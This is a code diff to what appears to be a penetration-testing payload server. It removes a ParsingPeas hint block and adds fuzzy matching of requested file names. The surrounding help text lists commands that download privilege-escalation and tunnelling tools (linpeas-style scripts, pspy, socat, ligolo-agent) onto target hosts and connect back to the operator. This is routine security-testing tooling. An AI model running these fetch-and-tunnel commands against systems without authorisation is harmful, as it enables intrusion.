@@ -184,11 +184,6 @@ Linux download hints
   wget {base_url}/lse.sh -O lse.sh && chmod +x lse.sh
   wget {base_url}/pspy64 -O pspy64 && chmod +x pspy64
   wget {base_url}/socat -O socat && chmod +x socat
-
-ParsingPeas
-  # Prefer ParsingPeas on 8000 and move payload-server to 8001 if you need both.
-  parsingpeas linux --lhost {lhost}
-  parsingpeas linux --lhost {lhost} --start
 """.strip(
             "\n"
         )
@@ -208,11 +203,6 @@ Windows download hints
   certutil -urlcache -split -f {base_url}/bin/ligolo-agent.exe ligolo-agent.exe
   powershell -c "iwr {base_url}/bin/winpeas.exe -OutFile winpeas.exe"
   .\\ligolo-agent.exe -connect {lhost}:11601 -ignore-cert
-
-ParsingPeas
-  # Prefer ParsingPeas on 8000 and move payload-server to 8001 if you need both.
-  parsingpeas windows --lhost {lhost}
-  parsingpeas windows --lhost {lhost} --start
 """.strip(
             "\n"
         )
@@ -284,6 +274,48 @@ def best_child(directory: Path, wanted: str) -> str | None:
     return None
 
 
+def best_descendant_file(directory: Path, wanted: str) -> Path | None:
+    try:
+        files = [path for path in directory.rglob("*") if path.is_file()]
+    except OSError:
+        return None
+
+    if not files:
+        return None
+
+    wanted_lower = wanted.lower()
+    wanted_root, wanted_ext = os.path.splitext(wanted_lower)
+    exact = [path for path in files if path.name.lower() == wanted_lower]
+    if len(exact) == 1:
+        return exact[0]
+
+    def score(path: Path) -> tuple[float, ...] | tuple[int, ...]:
+        name_lower = path.name.lower()
+        name_root, name_ext = os.path.splitext(name_lower)
+        root_ratio = difflib.SequenceMatcher(None, wanted_root, name_root).ratio()
+        full_ratio = difflib.SequenceMatcher(None, wanted_lower, name_lower).ratio()
+        same_ext = int(name_ext == wanted_ext)
+        starts = int(name_lower.startswith(wanted_root))
+        contains = int(wanted_root in name_root)
+        depth = len(path.relative_to(directory).parts)
+        return (same_ext, starts, contains, root_ratio, full_ratio, -depth, -len(name_lower))
+
+    candidates = [
+        path
+        for path in files
+        if path.name.lower().startswith(wanted_lower) or wanted_lower in path.name.lower()
+    ]
+    if candidates:
+        return max(candidates, key=score)
+
+    lowered = {path.name.lower(): path for path in files}
+    fuzzy = difflib.get_close_matches(wanted_lower, list(lowered), n=3, cutoff=0.55)
+    if fuzzy:
+        return max((lowered[item] for item in fuzzy), key=score)
+
+    return None
+
+
 def fuzzy_translate(root: Path, url_path: str) -> tuple[Path, str | None]:
     parsed = urllib.parse.urlsplit(url_path)
     raw_path = urllib.parse.unquote(parsed.path)
@@ -301,6 +333,12 @@ def fuzzy_translate(root: Path, url_path: str) -> tuple[Path, str | None]:
     for part in parts:
         match = best_child(current, part)
         if match is None:
+            descendant = best_descendant_file(current, part)
+            if descendant is not None:
+                corrected_parts.extend(descendant.relative_to(current).parts)
+                current = descendant
+                changed = True
+                break
             return exact, None
         if match != part:
             changed = True
